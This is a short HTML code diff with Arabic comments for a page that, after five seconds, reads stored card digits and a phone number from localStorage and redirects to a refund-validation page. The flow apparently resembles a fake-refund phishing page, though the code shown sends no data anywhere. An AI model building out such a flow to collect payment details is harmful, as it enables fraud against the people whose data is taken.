@@ -107,8 +107,15 @@
     </div>
 
     <!-- Script JavaScript للتوجيه بعد 5 ثوانٍ -->
-<script>
-    setTimeout(() => {
-        window.location.href = "validation_remboursement.html";
-    }, 5000); // التوجيه بعد 5 ثوانٍ
-</script>
+    <script>
+        setTimeout(() => {
+            // تخزين البيانات لضمان وجودها عند التوجيه إلى الصفحة الثالثة
+            const lastFourDigits = localStorage.getItem('lastFourDigits') || '0000';
+            const phoneNumber = localStorage.getItem('phoneNumber') || 'Non renseigné';
+
+            // إعادة توجيه مع ضمان استمرار البيانات
+            window.location.href = "validation_remboursement.html";
+        }, 5000); // التوجيه بعد 5 ثوانٍ
+    </script>
+</body>
+</html>
